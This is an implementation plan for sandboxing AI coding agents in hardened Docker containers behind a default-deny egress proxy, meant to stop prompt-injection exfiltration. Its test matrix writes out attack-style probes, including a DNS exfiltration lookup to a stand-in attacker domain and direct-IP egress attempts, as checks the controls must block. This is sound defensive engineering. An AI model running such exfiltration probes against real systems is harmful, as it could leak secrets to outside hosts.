# P2-07 — Sandbox Hardening + Default-Deny Egress — Implementation Plan

**Task ID:** P2-07 · **Milestone:** M6 · **Priority:** P0 launch-tier security — the primary
prompt-injection exfiltration control.
**Depends on:** P2-05 (`GitLoomEnv` + dockerd), P2-06 (ext4 worktrees to mount).
**Branch:** implement on `feature/P2-07-sandbox-hardening` off `phase2`; PR targets `phase2`.

> **Source of truth:** §P2-07 of `docs/GitLoom_Master_Implementation_Document_v2.md` (binds
> strategy §G-7.2c + the market promotion to launch tier). Global invariants **G-11** (no Windows
> mounts), **G-15** (hardened container spec is mandatory), **G-16** (no runtime `docker build`).
> This is a security-relevant PR (global rule 4): execute the listed security checks and paste
> evidence into the PR; the reviewer re-runs at least one.

---

## 0. Context — what exists today

P2-06 gives the daemon ext4 worktrees; nothing containerizes agents yet. This task ships the
container runtime: a hardened Docker container per agent plus a default-deny egress proxy, so a
prompt-injected agent cannot exfiltrate secrets or reach arbitrary hosts. P2-01's
`CredentialInjector` content lands on a per-agent tmpfs here.

### What you can rely on

| Fact | Where |
|---|---|
| `CredentialInjector.BuildEnvFileContent` (in-memory env-file content) | `GitLoom.Core/Security/CredentialInjector.cs` (P2-01) |
| Ext4 worktree paths per agent; quarantine `origin` | `GitLoom.Core/Agents/WorktreeManager.cs` (P2-06) |
| Daemon host, gRPC, logging mask | `GitLoom.Server/` (P2-02) |
| dockerd inside `GitLoomEnv` (socket waited on at bootstrap) | P2-05 |

Dependencies to add (daemon only): `Docker.DotNet`. The UI must never reference it (G-18).

---

## 1. Files to create / modify

| Action | Path |
|---|---|
| **Create** | `GitLoom.Core/Agents/Sandbox/SandboxEngine.cs` (`ISandboxEngine` + Docker impl) |
| **Create** | `GitLoom.Core/Agents/Sandbox/ContainerSpecBuilder.cs` (pure: agent params → `CreateContainerParameters`) |
| **Create** | `GitLoom.Core/Agents/Sandbox/EgressProxyConfigurator.cs` (network + proxy container + allowlist) |
| **Create** | `GitLoom.Core/Agents/Sandbox/EgressAllowlist.cs` (model + persistence + change log events) |
| **Create** | `images/gitloom-agent-base/` (Dockerfile for the static base image with Nix/Devbox; built in CI/release pipeline, **never at runtime**) |
| **Create** | `images/gitloom-egress-proxy/` (proxy image config: e.g. tinyproxy/squid + dnsmasq pinned DNS + iptables rules script) |
| **Edit** | `GitLoom.Server` wiring (engine construction; spawn path consumes P2-06 worktrees) |
| **Create** | `GitLoom.App/ViewModels/EgressAllowlistViewModel.cs` + view (user-visible/editable allowlist; changes logged) |
| **Create** | `GitLoom.Tests/ContainerSpecBuilderTests.cs`, `EgressAllowlistTests.cs`, `GitLoom.Tests/Integration/EgressMatrixTests.cs` (tagged `RequiresDocker`), `SandboxInspectTests.cs` (tagged `RequiresDocker`) |
| **Edit** | `AGENTS.md` Repository Map |

---

## 2. Contract (binding)

**`SandboxEngine`** (Docker.DotNet `CreateContainerAsync`):

- Static base image with Nix/Devbox — toolchains sideload via `devbox add` into the running
  container; **no runtime `docker build`** (G-16 — it severs PTYs).
- Container spec: `no-new-privileges`, **userns remap**, default seccomp, memory + pids limits,
  worktree mount **from ext4 only** (G-11), tmpfs `/dev/shm` and a per-agent credentials tmpfs
  (P2-01 injector content, file mode **0400**), read-only rootfs where tolerated.
- Per-repo persistent jail: containers are reused across sessions (`docker start` if stopped),
  keyed by repo hash + agent id.

**`EgressProxyConfigurator`:**

- An internal Docker network whose **only** route out is a proxy container; default-deny.
- Allowlist = model APIs + package registries + the repo's git host. DNS pinned to the proxy.
- `HTTP(S)_PROXY` env **and** iptables DROP on direct egress (proxy-env-only enforcement is a
  rejection trigger).
- Allowlist user-visible and editable; every change logged (feeds P2-17 network transparency).

---

## 3. Implementation steps

### 3.1 `ContainerSpecBuilder` (pure — unit-testable heart)

Input: `(repoHash, agentId, worktreePath, imageRef, limits, networkName, credTmpfsSpec)` →
`CreateContainerParameters` with:

```
HostConfig:
  SecurityOpt   = ["no-new-privileges"]            // + default seccomp (do not pass unconfined)
  UsernsMode    = per daemon userns-remap config
  Memory        = limits.MemoryBytes; PidsLimit = limits.Pids
  ReadonlyRootfs= true where the base image tolerates it (rw /tmp, /home/agent via tmpfs/volumes)
  Mounts        = [{ Source: <ext4 worktree>, Target: /workspace, Type: bind }]   // ext4 ONLY
  Tmpfs         = { "/dev/shm": "", "/run/secrets": "size=1m,mode=0700" }
  NetworkMode   = <internal agent network>
Env             = HTTP_PROXY/HTTPS_PROXY/NO_PROXY → proxy; never secrets (G-13)
```

The builder **throws typed** if the worktree source matches `^/mnt/[a-z]/`, a UNC, or a Windows
drive pattern — G-11 enforced at construction, not just inspected after.

### 3.2 Credentials tmpfs

Spawn writes `BuildEnvFileContent` output into the container's `/run/secrets/agent.env` via
Docker exec/attach copy after start (content never on persistent disk, never in `Env`, never
argv), `chmod 0400`, owner = agent uid. Adapter launch sources it. **Per-agent** tmpfs: no
`~/.claude` or global auth-dir mounts, ever (invariant).

### 3.3 Egress network

- `EnsureNetworkAsync`: create internal network `gitloom-agents` (`Internal = true`) + attach the
  proxy container with a second leg on the egress-capable network.
- Proxy container: allowlist-driven HTTP(S) CONNECT proxy; dnsmasq answering **only** allowlisted
  names (everything else NXDOMAIN → kills DNS exfiltration); iptables inside the agent network
  namespace (or on the proxy as the only gateway) DROP non-proxy egress.
- Allowlist model: named entries with hostname patterns; defaults: `api.anthropic.com`,
  `api.openai.com`, `registry.npmjs.org`, `pypi.org`/`files.pythonhosted.org`, `nuget.org`
  endpoints, crates.io, and the provisioned repo's git host. Persisted per repo; UI edit +
  change-logging event (`AllowlistChanged{who,when,entry,action}`) — P2-15 chains it later,
  P2-17 displays it.

### 3.4 `SandboxEngine` lifecycle

`SpawnAsync` (create-or-start persistent jail: `docker start` when a stopped container exists —
edge: base-image upgrade recreates), `ExecAsync` (devbox add etc.), `StopAsync`, `RemoveAsync`.
Docker is the sole source of truth for liveness (P2-08 reconciler consumes this; no PID files).

### 3.5 Optional sbx backend (MAY — acceptable variation)

`ISandboxEngine` is the seam: a `DockerSandboxEngine` (this task) and, optionally later, an
`SbxSandboxEngine` (Docker Sandboxes microVM + Locked-Down egress preset). Do **not** make sbx a
hard dependency (rejection trigger). Keep the interface engine-agnostic (no Docker.DotNet types in
`ISandboxEngine`'s signature).

---

## 4. Edge-case matrix (binding — each row needs a test; egress rows in the `RequiresDocker` integration suite)

| Case | Required behavior |
|---|---|
| allowlisted `curl https://api.anthropic.com` | succeeds via proxy |
| `curl https://example.com` | fails **fast** (connection refused by proxy policy, not a timeout) |
| direct-IP egress (`curl http://1.1.1.1`) | fails (iptables DROP — proves the backstop, not just proxy env) |
| DNS exfil (`dig x.attacker.tld`) | fails (pinned DNS answers allowlisted names only) |
| `devbox add jq` during a live PTY session | survives — session uninterrupted, tool available |
| worktree source on `/mnt/c` | spec builder throws typed; container never created |
| stopped persistent jail respawned | `docker start` path; same container id, state preserved |

---

## 5. Invariants (MUST)

1. **G-11 / G-15 / G-16** — every one asserted by a test, not just reviewed.
2. Every verification bullet below is **evidenced in the PR description** (security-relevant PR
   rule): egress matrix output, `docker inspect` excerpts.
3. Credential tmpfs is per-agent; no global auth-dir mounts.
4. The UI talks to sandboxes only via the daemon (no `Docker.DotNet` in `GitLoom.App`, G-18).

---

## 6. Test contract

| # | Test | Assertion |
|---|---|---|
| 1 | `SpecBuilder_HardeningFlags` | `no-new-privileges`, userns, memory/pids limits, tmpfs entries all present on the create request |
| 2 | `SpecBuilder_RejectsWindowsMounts` | `/mnt/c/...`, `C:\...`, `\\wsl.localhost\...` sources → typed throw |
| 3 | `SpecBuilder_NoSecretsInEnv` | env contains proxy vars only; a "secret" input surfaces nowhere in the spec |
| 4 | `Allowlist_DefaultsAndPersistence` | defaults present; add/remove round-trips; change events emitted |
| 5 | `EgressMatrix_*` (`RequiresDocker`) | the five egress rows above, end-to-end in `GitLoomEnv`/Linux CI |
| 6 | `Inspect_NoWindowsPaths_UsernsLimits` (`RequiresDocker`) | `docker inspect` on a spawned agent: zero `/mnt/c`/`drvfs`/UNC mounts; userns + limits live (G-11 test promised by P2-06) |
| 7 | `PersistentJail_StartNotRecreate` (`RequiresDocker`) | second spawn reuses the container |
| 8 | `CredTmpfs_Mode0400_TmpfsBacked` (`RequiresDocker`) | in-container `stat`: 0400, tmpfs mount; file absent on VM disk |

---

## 7. Rejection triggers / Reviewer script

**Rejection:** proxy-env-only enforcement (no iptables backstop); a "temporary" `--privileged`;
making sbx a hard dependency; runtime `docker build` (grep `ImageBuild`); any secret in `Env`.

```bash
dotnet build GitLoom.slnx
dotnet test --filter "FullyQualifiedName~ContainerSpecBuilder|FullyQualifiedName~EgressAllowlist"
# inside GitLoomEnv / Linux CI:
dotnet test --filter "Category=RequiresDocker"
grep -rn "ImageBuild" GitLoom.Core/ GitLoom.Server/      # 0 hits (G-16)
grep -rn "Privileged" GitLoom.Core/Agents/Sandbox/       # 0 true assignments
grep -rn "Docker.DotNet" GitLoom.App/                    # 0 hits (G-18)
docker inspect <agent> | grep -i "mnt/c\|drvfs"          # 0 hits — paste into PR
```

---

## 8. Definition of done

- [ ] Hardened spec builder (typed Windows-mount rejection) + `SandboxEngine` persistent jails.
- [ ] Egress: internal network + proxy + pinned DNS + iptables backstop; editable, logged allowlist.
- [ ] Credentials on per-agent tmpfs 0400; no secrets in env/argv/spec.
- [ ] Full egress matrix + inspect assertions green in Docker CI; evidence pasted in the PR.
- [ ] `AGENTS.md` Repository Map updated. One task = one PR linking **P2-07**, base `phase2`.
